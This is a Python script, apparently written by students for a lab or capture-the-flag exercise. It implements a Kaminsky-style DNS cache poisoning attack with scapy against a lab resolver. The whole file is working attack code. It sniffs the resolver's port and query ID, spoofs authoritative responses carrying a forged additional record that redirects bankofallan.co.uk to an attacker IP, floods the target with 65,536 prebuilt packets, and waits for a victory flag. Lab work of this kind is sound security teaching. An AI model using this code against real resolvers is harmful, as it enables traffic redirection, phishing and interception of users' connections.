#! /usr/bin/env python3
# -*- coding: utf-8 -*-
"""Venom DNS server attacker

This script makes

"""
import signal
import string

from scapy.config import conf
from scapy.packet import Raw

from util import decode_dns_message

__author__ = "Andrea Lacava (1663286), Matteo Attenni (1655314), Ilaria Clemente (1836039)"
__credits__ = ["Andrea Lacava", "Matteo Attenni", "Ilaria Clemente"]
__license__ = "GPL"
__version__ = "1.0"
__email__ = "lacava.1663286@studenti.uniroma1.it, attenni.1655314@studenti.uniroma1.it, " \
            "clemente.1836039@studenti.uniroma1.it"
__status__ = "Production"

import sys
import threading
import time

from socket import *
from random import *

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send, sniff

# print headers just for debug and info
DNS_ROUTINE_HEADER = "[DNS_SERVER_ROUTINE]: "
BITE_THE_RAT_HEADER = "[BITE_THE_RAT]: "
LISTENER_HEADER = "[LISTENER_FLAG]: "
MAIN_HEADER = "[MAIN]: "

TARGET_IP = "192.168.56.101"  # vulnDNS's IP

BAD_DNS_SERVER_IP = "192.168.56.1"  # DNS endpoint IP of badguy.ru (also present on config.json)
BAD_DNS_SERVER_PORT = 55553  # DNS endpoint port of badguy.ru (also present on config.json)

SPOOFED_DNS = "10.0.0.1"
URL_TO_POISON = "bankofallan.co.uk"
DNS_URL_BADGUY = "badguy.ru"

BADGUY_REDIRECT_IP = "192.168.56.1"
VICTORY_FLAG_PORT = 1337
BUFFER_SIZE = 8192

NUMBER_OF_PACKETS = 2000  # number of packets per attempt
NUMBER_OF_ATTEMPTS = 250  # if the attack continue to fail, please increase, it is set to lower numbers just for debug
TIME_SLEEP_SECONDS = 2  # seconds of delay before attack

ATTACK_GOING_ON = True

TARGET_PORT = 0
STARTING_QUERY_ID = 0


def signal_handler():
    print('You pressed Ctrl+C, Closing everything!')
    global ATTACK_GOING_ON
    ATTACK_GOING_ON = False
    sys.exit(0)


def dns_server_routine():
    print(DNS_ROUTINE_HEADER + "Starting routine of DNS sniffer of badguy.ru")
    global ATTACK_GOING_ON
    global STARTING_QUERY_ID
    global TARGET_PORT

    while ATTACK_GOING_ON:
        a = sniff(filter="port " + str(BAD_DNS_SERVER_PORT), count=1, promisc=1)
        if a[0].haslayer(IP):
            # print(DNS_ROUTINE_HEADER + "Packet sniffed, analyzing...")
            sniffed_packet = a[0]
            sniffed_ip = sniffed_packet.getlayer(IP)
            target_port = sniffed_ip.sport
            # print(DNS_ROUTINE_HEADER + "Sniffed ip src " + str(sniffed_ip.src)
            #      + ", src port: " + str(sniffed_ip.sport))
            # print(DNS_ROUTINE_HEADER + "Dst ip:" + str(sniffed_ip.dst) + ", dest port:" + str(sniffed_ip.dport))
            if TARGET_PORT != target_port:
                print(DNS_ROUTINE_HEADER + "New target port is \"" + str(target_port) + "\".")
                TARGET_PORT = target_port
            if sniffed_packet.haslayer(DNS):
                first_query_id = sniffed_packet.getlayer(DNS).id
            else:
                try:
                    first_query_id = decode_dns_message(a[0].getlayer(Raw).load)["id"]
                except Exception:  # this is usually raised when attack is failed
                    print(DNS_ROUTINE_HEADER + "Packet not decoded, probably attack failure! Skipping on...")
                    continue

            print(DNS_ROUTINE_HEADER + "New query id found is \"" + str(first_query_id) + "\".")
            STARTING_QUERY_ID = first_query_id

            # we just reply here to the request
            dns_record_request = DNSQR(qname=DNS_URL_BADGUY)
            dns_answer = DNSRR(rrname=DNS_URL_BADGUY, type="A", ttl=5600, rclass="IN", rdata="192.168.56.1")
            # print(DNS_ROUTINE_HEADER + "Sending badguy.ru DNS response...")
            res_packet = (IP(src=BADGUY_REDIRECT_IP, dst=TARGET_IP) /
                          UDP(dport=target_port) /
                          DNS(id=first_query_id, qr=1, aa=1, ra=0, rcode=0, qd=dns_record_request, an=dns_answer))
            send(res_packet, verbose=0)
        # print(DNS_ROUTINE_HEADER + "Response sent!")
    print(DNS_ROUTINE_HEADER + "It seems attack is finished, bye bye!")


def randomize_url(url_length=3):
    letters = string.ascii_lowercase
    return "".join(choice(letters) for i in range(url_length)) + "."


def random_query_id(modifier=0):
    return randint(1, modifier) % 65536  # 16 bit maximum delimiter of query_id's DNS field


def bite_the_rat():
    """
    Attack function.


    """
    global TARGET_PORT
    global STARTING_QUERY_ID
    global ATTACK_GOING_ON
    global NUMBER_OF_ATTEMPTS

    print(BITE_THE_RAT_HEADER + "Sleeping for " + str(TIME_SLEEP_SECONDS) + " seconds to allow DNS sniffer startup...")
    time.sleep(TIME_SLEEP_SECONDS)
    print(BITE_THE_RAT_HEADER + "We first send a request to " + TARGET_IP + " " +
          "asking for badguy.ru to get an initial query id and" + " port with our DNS with DNS server, " +
          "then we craft attack " +
          "packet, we send a request and the response payload.")
    # we need this request to get a get an updated value of query id
    first_dns_req = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(id=random_query_id(25), rd=1,
                                                            qd=DNSQR(qname=DNS_URL_BADGUY))
    send(first_dns_req, verbose=0)
    time.sleep(TIME_SLEEP_SECONDS)

    print(BITE_THE_RAT_HEADER + "Starting attack socket...")
    sock = conf.L3socket()  # the send() function of scapy is not enough fast so we use the lower level
    payloaded_packets = []
    print(BITE_THE_RAT_HEADER + "Socket started!")
    random_url = randomize_url(randint(1, 3)) + URL_TO_POISON
    print(BITE_THE_RAT_HEADER + "Creating attack packets with url:\"" + random_url + "\"...")
    dns_record_req = DNSQR(qname=random_url)
    dns_authoritative_answer = DNSRR(rrname=random_url, type="A", ttl=10000, rclass="IN", rdata="4.4.4.4")
    dns_additional_answer = DNSRR(rrname=URL_TO_POISON, rdata=BADGUY_REDIRECT_IP, type="A", rclass="IN", ttl=10000)

    # id is random but it not necessary
    dns_malicious_req = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(id=random_query_id(25), rd=1, qd=dns_record_req)

    for query_id in range(65536):
        # print(BITE_THE_RAT_HEADER + "query id packet: " + str(query_id))
        attack_res_packet = (IP(src=SPOOFED_DNS, dst=TARGET_IP) /
                             UDP(dport=TARGET_PORT) /
                             DNS(id=query_id, qd=dns_record_req, qr=1, aa=1, ra=0, ar=dns_additional_answer,
                                 an=dns_authoritative_answer))
        payloaded_packets.append(attack_res_packet)
    # wrpcap('attack_example.pcap', payloaded_packets[0]) # just used for the final relation
    print(BITE_THE_RAT_HEADER + "Attack packets created! Sending request and fake responses...")
    j = 1
    while ATTACK_GOING_ON:
        # since we've to guess the new query id we define an incremental pseudo random generator
        print(BITE_THE_RAT_HEADER + "Target port is \"" + str(TARGET_PORT) + "\", starting query id is \"" +
              str(STARTING_QUERY_ID) + "\".")

        guessed_query_id = STARTING_QUERY_ID + random_query_id(10)
        sock.send(dns_malicious_req)
        for i in range(NUMBER_OF_PACKETS):
            guessed_query_id = (guessed_query_id + i) % 65536
            sock.send(payloaded_packets[guessed_query_id])
            # print("Starting query id: " + str(STARTING_QUERY_ID) + ", guessed query id: " + str(guessed_query_id))

        if j > NUMBER_OF_ATTEMPTS:
            ATTACK_GOING_ON = False
            print(BITE_THE_RAT_HEADER + "Number of attempts reached! Attack failed :(")
            print(BITE_THE_RAT_HEADER + "We send an UDP packet to kill the listener and the DNS servers")
            death_flag_pkt = (IP(src=TARGET_IP, dst=BADGUY_REDIRECT_IP) /
                              UDP(sport=randint(5000, 6000), dport=VICTORY_FLAG_PORT) /
                              Raw(load="Attack failed!"))

            sock.send(death_flag_pkt)
            death_flag_pkt = (IP(src=TARGET_IP, dst=BADGUY_REDIRECT_IP) /
                              UDP(sport=randint(5000, 6000), dport=BAD_DNS_SERVER_PORT) /
                              Raw(load="Attack failed!"))
            sock.send(death_flag_pkt)
        else:
            print(BITE_THE_RAT_HEADER + "Attack packets sent, attempt " + str(j) + "/" + str(
                NUMBER_OF_ATTEMPTS) + " failed, updating id...")
            first_dns_req = (IP(dst=TARGET_IP) / UDP(dport=53) /
                             DNS(id=random_query_id(10), rd=1, qd=DNSQR(qname=DNS_URL_BADGUY)))
            send(first_dns_req, verbose=0)
            time.sleep(TIME_SLEEP_SECONDS)
            j += 1
    print(BITE_THE_RAT_HEADER + "Attack finished, closing socket...")
    sock.close()


def flag_victory_listener():
    """
    This function listens on port 1337 the Victory flag.

    """
    sock = socket(AF_INET,  # Internet
                  SOCK_DGRAM)  # UDP
    print(LISTENER_HEADER + "Starting server...")
    sock.bind(("", VICTORY_FLAG_PORT))
    print(LISTENER_HEADER + "done!")
    global ATTACK_GOING_ON

    while ATTACK_GOING_ON:
        try:
            data, addr = sock.recvfrom(BUFFER_SIZE)
            print(LISTENER_HEADER + "Received from \"" + addr[0] + "\": " + str(data))
            ATTACK_GOING_ON = False
        except KeyboardInterrupt:
            print(LISTENER_HEADER + "Closing socket to exit gracefully...")
            sock.close()
            print(LISTENER_HEADER + "Socket closed, bye bye!")
            sys.exit(0)

    ATTACK_GOING_ON = False
    print(LISTENER_HEADER + "Attack finished, closing socket to exit gracefully...")
    sock.close()
    print(LISTENER_HEADER + "Socket closed, bye bye!")


def main():
    print(MAIN_HEADER + "Initializing attack...")
    flag_victory_thread = threading.Thread(name="flag_victory_thread", target=flag_victory_listener)
    print(MAIN_HEADER + "Listener thread created!")
    print(MAIN_HEADER + "Starting listener to get victory flag...")
    flag_victory_thread.start()

    # point 1: send a dns request for badguy.ru
    print(MAIN_HEADER + "Starting DNS of badguy to get port and initial query id...")
    dns_badguy_thread = threading.Thread(name="dns_badguy_thread", target=dns_server_routine)
    bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat)
    dns_badguy_thread.start()
    bite_rat_thread.start()

    signal.signal(signal.SIGINT, signal_handler)

    bite_rat_thread.join()
    dns_badguy_thread.join()
    flag_victory_thread.join()


if __name__ == "__main__":
    main()
